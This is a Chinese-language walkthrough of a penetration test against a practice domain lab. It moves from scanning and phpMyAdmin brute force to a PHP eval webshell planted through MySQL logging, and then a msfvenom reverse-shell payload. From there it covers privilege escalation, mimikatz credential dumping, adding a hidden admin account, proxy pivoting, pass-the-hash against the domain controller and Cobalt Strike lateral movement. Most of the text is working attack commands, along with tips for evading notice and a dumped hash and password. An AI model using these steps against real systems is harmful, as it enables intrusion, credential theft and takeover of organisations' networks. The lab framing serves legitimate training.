# Web渗透测试对靶机注入shell

## 1.寻找目标信息

### netdiscover扫描

打开kali，使用root权限，输入命令

```
netdiscover
```

![image-20211214185824204](https://gitee.com/xxb667/img/raw/master/img/image-20211214185824204.png)

目标主机为显示 VMare的IP地址得到目标主机IP地址为：192.168.0.4

### nmap扫描

输入命令

```
nmap -sV -O -T4 192.168.0.4
```

发现目标主机有端口3306是打开的

![image-20211214190022018](https://gitee.com/xxb667/img/raw/master/img/image-20211214190022018.png)

### 利用御剑后台进行扫描

输入域名（就是目标IP地址）：192.168.0.4

得到网页地址：[phpMyAdmin](http://192.168.0.4/phpmyadmin/db_create.php)

![image-20211214190130463](https://gitee.com/xxb667/img/raw/master/img/image-20211214190130463.png)

网页界面如下

![image-20211214190146927](https://gitee.com/xxb667/img/raw/master/img/image-20211214190146927.png)

## 2.对登录页面进行暴力破解

### 启动burp suite对目标网页进行拦截

![image-20211220090649561](https://gitee.com/xxb667/img/raw/master/img/image-20211220090649561.png)





### 对目标进行暴力破解

- 首先，单击【鼠标右键】--【发送给测试器】--点击【Intruder】
-  进入intruder界面后，点击【Positions】
-  然后点击【清除】把变量都清楚了
- 选中【admin】（username和password）后面的值，单击【添加】，把要进行暴力破解的变量进行添加
- 下拉攻击类型选中【Clusterbomb】



![image-20211220090904268](https://gitee.com/xxb667/img/raw/master/img/image-20211220090904268.png)

![image-20211219223546375](C:/Users/18393/AppData/Roaming/Typora/typora-user-images/image-20211219223546375.png)

- 然后点击【Payload】
- 有效负载集为1载入Username.txt文件中的数据
- 有效负载集为2载入Password.txt文件中的数据
-  然后点击【开始攻击】:程序自动进行暴力破解
- 匹配用户名和密码
  - 破解得到用户名为：root
  -  密码为：root





![image-20211214191602209](https://gitee.com/xxb667/img/raw/master/img/image-20211214191602209.png)



![image-20211219223904927](C:/Users/18393/AppData/Roaming/Typora/typora-user-images/image-20211219223904927.png)

![image-20211214191602209](https://gitee.com/xxb667/img/raw/master/img/image-20211214191602209.png)



## 3.进入phpmyadmin界面

### 查看主页信息

![image-20211220093336920](https://gitee.com/xxb667/img/raw/master/img/image-20211220093336920.png)



### 对目标信息进行渗透处理

#### 查看日志是否打开

- 点击【变量】
  - 查看是否开启日志和日志地址



![image-20211220091655447](https://gitee.com/xxb667/img/raw/master/img/image-20211220091655447.png)



#### 创建日志文件getshell

```
进入SQL界面
#set global general_log=on; #开启日志
set global general_log_file = 'C:/phpstudy/www/xxb.php'; #设置指定文件为网址日志存放文件
select '<?php @eval($_POST["xxb"]);?>';	

```

![image-20211220092104020](https://gitee.com/xxb667/img/raw/master/img/image-20211220092104020.png)



![image-20211214192205996](https://gitee.com/xxb667/img/raw/master/img/image-20211214192205996.png)

再次进入【变量】

   把general log_file的路径中的文件名换成刚才新建的文件名

![](https://gitee.com/xxb667/img/raw/master/img/20211220095842.png)





## 4.用中国蚁剑进行连接

### 建立连接

注意后缀名和密码

点击测试连接--连接成功--保存这个状态

![image-20211220092951504](https://gitee.com/xxb667/img/raw/master/img/image-20211220092951504.png)



### 用kali生成木马文件

```
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.59.134 LPORT=4444 -f exe -o /home/kali/xxb.exe
```

#### 注意

LHOST的IP地址

和/home/kali/xxb.exe的路径和文件名

建议把文件名改成自己想的名字





### 把生成的文件上传到服务器

![image-20211220093156310](https://gitee.com/xxb667/img/raw/master/img/image-20211220093156310.png)



### 用kali进行监听

```
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.0.32
set lport 4444
run
```

![image-20211214193543801](https://gitee.com/xxb667/img/raw/master/img/image-20211214193543801.png)

![image-20211214193609301](https://gitee.com/xxb667/img/raw/master/img/image-20211214193609301.png)

#### 用中国蚁剑运行程序

![image-20211214193706012](https://gitee.com/xxb667/img/raw/master/img/image-20211214193706012.png)

去kali看看

入侵成功

![image-20211214193754944](https://gitee.com/xxb667/img/raw/master/img/image-20211214193754944.png)

## 5.后渗透阶段

### 查看当前角色

```
getuid
```

![image-20211215125428622](https://gitee.com/xxb667/img/raw/master/img/image-20211215125428622.png)

### 提权

提升权限

这里由于获得的直接是adminsitrator权限，所以可以直接提到system。在真实环境中，这里很多时候都是一个普通用户权限，需要我们去提权。

```
getsystem #进行提权
getuid
```

![image-20211215125645611](https://gitee.com/xxb667/img/raw/master/img/image-20211215125645611.png)

### 迁移进程

我们目前shell是32位的程序 ， 需要将`meterpreter`迁移到64位的程序上面 而且是system权限运行，否则很多命令执行不了

```
ps  #查看进程信息
```

找到 svchost.exe程序的进程号为644

![image-20211215130231943](https://gitee.com/xxb667/img/raw/master/img/image-20211215130231943.png)

```
migrate 644
```

![image-20211215130345397](https://gitee.com/xxb667/img/raw/master/img/image-20211215130345397.png)

### 获取账号密码

```shell
hashdump    # 获取密码哈希值
run windows/gather/smart_hashdump  #导出密码哈希值
```

![image-20211215131110401](https://gitee.com/xxb667/img/raw/master/img/image-20211215131110401.png)



### 加载 kiwi模块

mimikatz模块已经合并为kiwi模块

```
输入help查看具体用法
meterpreter > load kiwi
creds_all
```

![image-20211215131234291](https://gitee.com/xxb667/img/raw/master/img/image-20211215131234291.png)



![image-20211215131411041](https://gitee.com/xxb667/img/raw/master/img/image-20211215131411041.png)

#### 用法：

```
load kiwi

creds_all：列举所有凭据
creds_kerberos：列举所有kerberos凭据
creds_msv：列举所有msv凭据
creds_ssp：列举所有ssp凭据
creds_tspkg：列举所有tspkg凭据
creds_wdigest：列举所有wdigest凭据
dcsync：通过DCSync检索用户帐户信息
dcsync_ntlm：通过DCSync检索用户帐户NTLM散列、SID和RID
golden_ticket_create：创建黄金票据
kerberos_ticket_list：列举kerberos票据
kerberos_ticket_purge：清除kerberos票据
kerberos_ticket_use：使用kerberos票据
kiwi_cmd：执行mimikatz的命令，后面接mimikatz.exe的命令
lsa_dump_sam：dump出lsa的SAM
lsa_dump_secrets：dump出lsa的密文
password_change：修改密码
wifi_list：列出当前用户的wifi配置文件
wifi_list_shared：列出共享wifi配置文件/编码
```

### **远程桌面登录**

这里我们已经获得了`administrator`的账号和密码，现在我们既可以使用administrator账号登录，也可以新建账号登录(不建议直接用administrator身份登录，因为这样动静比较大，直接把管理员给挤掉，导致被发现)

新建账户开启3389 服务

```
启用远程桌面
run post/windows/manage/enable_rdp

run post/windows/manage/enable_rdp USERNAME=admin PASSWORD=123456

建议把用户名换一下
```

![image-20211215132142937](https://gitee.com/xxb667/img/raw/master/img/image-20211215132142937.png)

#### 用户添加失败

添加失败就换另一种方法试试

![image-20211215132525860](https://gitee.com/xxb667/img/raw/master/img/image-20211215132525860.png)

```
#错误代码
Account could not be created
[-] Error:
[*] The following Error was encountered: NameError undefined local variable or method `addusr_out' for #<Msf::Modules::Post__Windows__Manage__Enable_rdp::MetasploitModule:0x00007f577245bb88>
Did you mean?  add_group
[*] For cleanup execute Meterpreter resource file: /root/.msf4/loot/20211215132940_default_192.168.0.4_host.windows.cle_534939.txt

```

#### 去中国蚁剑进行添加

```
net user xxb1 123456/add  #添加用户名和密码
net user xxb1  #使用xxb1用户
net localgroup administrators xxb1  /add #把用户名添加到管理员组
```

![image-20211215134311930](https://gitee.com/xxb667/img/raw/master/img/image-20211215134311930.png)

#### 用MobaXterm进行远程连接

![image-20211215134603362](https://gitee.com/xxb667/img/raw/master/img/image-20211215134603362.png)



### **添加路由、挂Socks5代理**

由于我们要进一步扫描内网主机，但是由于不在一个网段上面，所以扫不到的，只能添加路由挂代理扫描。

- 添加路由的目的是为了让我们的MSF其他模块能访问内网的其他主机



我们知道另外一个网卡的IP是192.168.52.143

```
run get_local_subnets  #获取目标内网相关信息
run autoroute -s 192.168.53.0/24  #添加路由
run autoroute -p    #查看路由
```

![image-20211215135145859](https://gitee.com/xxb667/img/raw/master/img/image-20211215135145859.png)

![image-20211215135347307](https://gitee.com/xxb667/img/raw/master/img/image-20211215135347307.png)

### 连接代理

#### 端口修改

在kali终端里面

首先修改 

```
vim /etc/proxychains4.conf
```

修改端口：

```
socks5 127.0.0.1 1080
```

![image-20211215135748270](https://gitee.com/xxb667/img/raw/master/img/image-20211215135748270.png)

#### 把meterpreter 放在后台运行

```
background
```

```
use auxiliary/server/socks_proxy   #使用代理模块
show options   #保持默认即可
run
```

![image-20211215140343421](https://gitee.com/xxb667/img/raw/master/img/image-20211215140343421.png)

![image-20211215140416285](https://gitee.com/xxb667/img/raw/master/img/image-20211215140416285.png)

##### 返回meterpreter

```
show sessions #查看sessions
sessions 1  #看数字对应的
```

![image-20211215142008431](https://gitee.com/xxb667/img/raw/master/img/image-20211215142008431.png)

### 内网主机信息收集

```
auxiliary/scanner/discovery/udp_sweep    #基于udp协议发现内网存活主机
auxiliary/scanner/discovery/udp_probe    #基于udp协议发现内网存活主机
auxiliary/scanner/netbios/nbname         #基于netbios协议发现内网存活主机
```

这里我用了 第三个扫描,   速度很慢

```
use auxiliary/scanner/netbios/nbname 
options
set rhosts 192.168.52.0/24
run   
```

![image-20211215141843458](https://gitee.com/xxb667/img/raw/master/img/image-20211215141843458.png)



这个网段一共有三台主机



### 中国蚁剑终端使用命令

> 靶场环境有问题，好多命令不能执行
>
> *在hosts文件加入*
>
> *192.168.52.138 owa.god.org*   

```
net time /domain        #查看时间服务器
net user /domain        #查看域用户
net view /domain        #查看有几个域
net group "domain computers" /domain         #查看域内所有的主机名
net group "domain admins"   /domain          #查看域管理员
net group "domain controllers" /domain       #查看域控
net view                 # 查看局域网内其他主机名
net config Workstation   # 查看计算机名、全名、用户名、系统版本、工作站、域、登录域
```

从域信息收集可以得到以下信息：

- 域：god.org
- 域内有三个用户：administrator、ligang、liukaifeng01  （krbtgt密钥分发账户）
- 域内有三台主机：DEV1（这台主机不在此环境里面）、ROOT-TVI862UBEH(192.168.52.141)、STU1(192.168.52.143)
- 域控：OWA(192.168.52.138)
- 域管理员：administrator

由此可见，我们现在获得的即是域管理员权限。此环境内还有一台ROOT-TVI862UBEH(192.168.52.141)和域控OWA(192.168.52.138)。

![image-20211215142423491](https://gitee.com/xxb667/img/raw/master/img/image-20211215142423491.png)



### 内网存活主机服务探测（合集）

根据扫描的端口进行相应的模块扫描

```
auxiliary/scanner/ftp/ftp_version            #发现内网ftp服务，基于默认21端口
auxiliary/scanner/ssh/ssh_version            #发现内网ssh服务，基于默认22端口
auxiliary/scanner/telnet/telnet_version      #发现内网telnet服务，基于默认23端口
auxiliary/scanner/dns/dns_amp                #发现dns服务，基于默认53端口
auxiliary/scanner/http/http_version          #发现内网http服务，基于默认80端口
auxiliary/scanner/http/title                 #探测内网http服务的标题
auxiliary/scanner/smb/smb_version            #发现内网smb服务，基于默认的445端口   
auxiliary/scanner/mssql/mssql_schemadump     #发现内网SQLServer服务,基于默认的1433端口
auxiliary/scanner/oracle/oracle_hashdump     #发现内网oracle服务,基于默认的1521端口 
auxiliary/scanner/mysql/mysql_version        #发现内网mysql服务，基于默认3306端口
auxiliary/scanner/rdp/rdp_scanner            #发现内网RDP服务，基于默认3389端口
auxiliary/scanner/redis/redis_server         #发现内网Redis服务，基于默认6379端口
auxiliary/scanner/db2/db2_version            #探测内网的db2服务，基于默认的50000端口
auxiliary/scanner/netbios/nbname             #探测内网主机的netbios名字
```

## 6.内网横向渗透

在对内网主机进行信息收集后，接下来我们就是要对内网主机发动攻击。

### 哈希传递攻击

在域环境内，只有获得了**域管理员**的哈希才可以攻击。我们得到了域管理员administrator的哈希，在这里我们就可以用哈希传递攻击了。

在前面获得了域管理员 administrator 的NTLM哈希为：

```
a4ee66cc11243b7741dbb83262e7eba4
```

NTLM: 就是NT的哈希值，前面的章节已经介绍过

借助mimitkatz哈希传递工具

通过蚁剑上传到 web目录!

![image-20211217094945783](https://gitee.com/xxb667/img/raw/master/img/image-20211217094945783.png)

### 在meterpreter中运行

```
 shell #取得对服务器的某种权限
chcp 65001 #显示或设置活动代码页编号
cd c:\phpstudy\www
```

![image-20211217095420749](https://gitee.com/xxb667/img/raw/master/img/image-20211217095420749.png)

#### 运行命令 

```
mimikatz.exe
```

![image-20211217095557865](https://gitee.com/xxb667/img/raw/master/img/image-20211217095557865.png)

```
privilege::debug  #提升权限

```

```
#开始 Pass-The-Hash(hash传递攻击域控服务器  也就是 192.168.52.138）
#格式sekurlsa::pth  /user: 用户名 /domain:域控名 /ntlm: NTLM哈希
sekurlsa::pth /user:administrator /domain:"god.org" /ntlm:a4ee66cc11243b7741dbb83262e7eba4

```

![image-20211217095816176](https://gitee.com/xxb667/img/raw/master/img/image-20211217095816176.png)



exit 退出

#### 中国蚁剑上运行

我们直接远程执行 域控服务器上的命令

以下所有的命令是在跳板机上执行。

这里要在中国蚁剑上面执行，在msf里面 会失败

```shell
dir \\192.168.52.138\c$       #查看 C盘目录里面的文件  \\就是网络路径   $就是 根目录的意思
或者
dir \\owa\c$
```

![image-20211217102019467](https://gitee.com/xxb667/img/raw/master/img/image-20211217102019467.png)

##### 执行第二台机器上的命令

```
dir \\192.168.52.141\c$
```

![image-20211217101923714](https://gitee.com/xxb667/img/raw/master/img/image-20211217101923714.png)





## 7.使用cobaltstike联动MSF

### 安装cobaltstike



#### Cobaltstrike简介

Cobalt Strike是一款美国Red Team开发的渗透测试神器，常被业界人称为CS。。
最近这个工具大火，成为了渗透测试中不可缺少的利器。其拥有多种协议主机上线方式，集成了提权，凭据导出，端口转发，socket代理，office攻击，文件捆绑，钓鱼等功能。同时，Cobalt Strike还可以调用Mimikatz等其他知名工具，因此广受黑客喜爱。
项目官网:[https://www.cobaltstrike.com](https://www.cobaltstrike.com/)

早期版本CobaltSrtike依赖Metasploit框架，而现在Cobalt Strike已经不再使用MSF而是作为单独的平台使用，它分为客户端(Client)与服务端(Teamserver)，服务端是一个，客户端可以有多个，团队可进行分布式协团操作。



3.13版本文件架构如下。

│ Scripts 用户安装的插件
│ Log 每天的日志
│ c2lint 检查profile的错误异常
│ cobaltstrike
│ cobaltstrike.jar 客户端程序
│ icon.jpg LOGO
│ license.pdf 许可证文件
│ readme.txt
│ releasenotes.txt
│ teamserver 服务端程序
│ update
│ update.jar 更新程序
└─third-party 第三方工具，里面放的vnc dll

### 开启cobaltstike服务

#### kali上的操作

把压缩包  传到kali里面  

```
unzip cobaltstrike3.14.zip  
cd cobaltstrike3.14
chmod +x teamserver 
./teamserver 192.168.59.134 123456 # 启动 服务端格式为【./teamserver 你的kaliIP 密码】
```

![image-20211217094136280](https://gitee.com/xxb667/img/raw/master/img/image-20211217094136280.png)



#### 物理机上操作

在物理机上打开CobaltSrtike.exe文件



![image-20211217094416985](https://gitee.com/xxb667/img/raw/master/img/image-20211217094416985.png)

连接成功界面

![image-20211217094504752](https://gitee.com/xxb667/img/raw/master/img/image-20211217094504752.png)

### 开启监听

在CobaltStrike上开启一个监听

![image-20211217102312517](https://gitee.com/xxb667/img/raw/master/img/image-20211217102312517.png)



![image-20211217102415410](https://gitee.com/xxb667/img/raw/master/img/image-20211217102415410.png)

#### 添加监听

![image-20211217102629234](https://gitee.com/xxb667/img/raw/master/img/image-20211217102629234.png)

#### 查看添加

![image-20211217102939066](https://gitee.com/xxb667/img/raw/master/img/image-20211217102939066.png)

#### kali里面的操作

一定是渗透连接到主机之后，挂起meterpreter才可以进行以下命令

```
use exploit/windows/local/payload_inject
set payload windows/meterpreter/reverse_http
set DisablePayloadHandler true   #默认情况下，payload_inject执行之后会在本地产生一个新的handler，由于我们已经有了一                                   个，所以不需要在产生一个，所以这里我们设置为true
set lhost 192.168.0.32        #cobaltstrike监听的ip   就是服务端的IP
set lport 14444                 #cobaltstrike监听的端口 
set session 1                   #这里是获得的session的id
exploit
```

![image-20211217131658523](https://gitee.com/xxb667/img/raw/master/img/image-20211217131658523.png)

#### 返回cobaltstrike进行查看

我们打开cs 可以看到主机已经上线

![image-20211217133620982](https://gitee.com/xxb667/img/raw/master/img/image-20211217133620982.png)

### 建立会话交互

鼠标右键 ---会话交互

![image-20211217133738094](https://gitee.com/xxb667/img/raw/master/img/image-20211217133738094.png)

因为60秒执行一次命令，要等待的时间太长  我们改为2 秒，实战中不能改的太短，太短会引起防火墙或者杀软注意

在最下面 beacon  输入 sleep2  

![image-20211217134000918](https://gitee.com/xxb667/img/raw/master/img/image-20211217134000918.png)

### 查看命令

输入 help查看命令

![image-20211217134138094](https://gitee.com/xxb667/img/raw/master/img/image-20211217134138094.png)

### 抓取密码 

输入下面命令 抓取密码

```
logonpasswords
```

下面信息太长

我们去下一张图看一下主要信息

![image-20211217134627215](https://gitee.com/xxb667/img/raw/master/img/image-20211217134627215.png)

#### 得到密码

可以得到Administrator的

密码为

```
HONGRISEC@2019
```



![image-20211217135014603](https://gitee.com/xxb667/img/raw/master/img/image-20211217135014603.png)

#### 查看密码 

![image-20211217135629093](https://gitee.com/xxb667/img/raw/master/img/image-20211217135629093.png)

### 横向移动：

**鼠标右键 网络探测**

探测此网络下的其他主机

![image-20211217135900042](https://gitee.com/xxb667/img/raw/master/img/image-20211217135900042.png)

![image-20211217140159945](https://gitee.com/xxb667/img/raw/master/img/image-20211217140159945.png)

#### 新建监听器

- 这里我们新建一个监听器

- 攻击载荷我们选择带有**smb** 的

- 端口任意设置

![image-20211217151200624](https://gitee.com/xxb667/img/raw/master/img/image-20211217151200624.png)

![image-20211217154307780](https://gitee.com/xxb667/img/raw/master/img/image-20211217154307780.png)

#### 横向移动目标机

点击收集到的目标，就是上面箭头我们来到了，含有目标机的界面

然后我们先横向移动到 ROOT这台机器

选中我们刚才新建的那个监听

![image-20211217140721713](https://gitee.com/xxb667/img/raw/master/img/image-20211217140721713.png)

![image-20211217151514702](https://gitee.com/xxb667/img/raw/master/img/image-20211217151514702.png)

![image-20211217151640995](https://gitee.com/xxb667/img/raw/master/img/image-20211217151640995.png)

##### 查看网络拓扑图

出现下图说明已经成功

![image-20211217151735493](https://gitee.com/xxb667/img/raw/master/img/image-20211217151735493.png)

##### 横向移动第2个目标机

进行第二个目标机横向移动，和上面步骤一致

![image-20211217152915548](https://gitee.com/xxb667/img/raw/master/img/image-20211217152915548.png)

![image-20211217153140730](https://gitee.com/xxb667/img/raw/master/img/image-20211217153140730.png)

###### 查看网络拓扑图

得到网络拓扑图如下

![image-20211217153310019](https://gitee.com/xxb667/img/raw/master/img/image-20211217153310019.png)

